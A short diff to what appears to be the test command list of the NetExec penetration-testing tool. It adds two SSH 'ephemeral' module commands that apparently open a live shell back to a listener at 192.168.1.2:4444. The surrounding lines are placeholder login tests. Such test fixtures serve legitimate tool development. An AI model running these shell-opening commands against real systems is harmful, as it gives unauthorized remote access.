@@ -295,6 +295,8 @@ netexec ssh TARGET_HOST -u LOGIN_USERNAME -p LOGIN_PASSWORD --get-file /tmp/test
 netexec ssh TARGET_HOST -u LOGIN_USERNAME -p LOGIN_PASSWORD -x 'uname -a' -M ephemeral
 netexec ssh TARGET_HOST -u LOGIN_USERNAME -p LOGIN_PASSWORD -M ephemeral -o COMMAND='uname -a'
 netexec ssh TARGET_HOST -u LOGIN_USERNAME -p LOGIN_PASSWORD -M ephemeral -o SCRIPT='data/netexec_ephemeral_test_script.sh'
+netexec ssh TARGET_HOST -u LOGIN_USERNAME -p LOGIN_PASSWORD -M ephemeral -o LIVESHELL=TRUE LHOST=192.168.1.2 LPORT=4444
+netexec ssh TARGET_HOST -u LOGIN_USERNAME -p LOGIN_PASSWORD -M ephemeral -o LIVESHELL=TRUE LHOST=192.168.1.2 LPORT=4444 KILLFILE=/tmp/kill
 ##### FTP- Default test passwords and random key; switch these out if you want correct authentication
 netexec ftp TARGET_HOST -u LOGIN_USERNAME -p LOGIN_PASSWORD
 netexec ftp TARGET_HOST -u LOGIN_USERNAME -p LOGIN_PASSWORD --ls
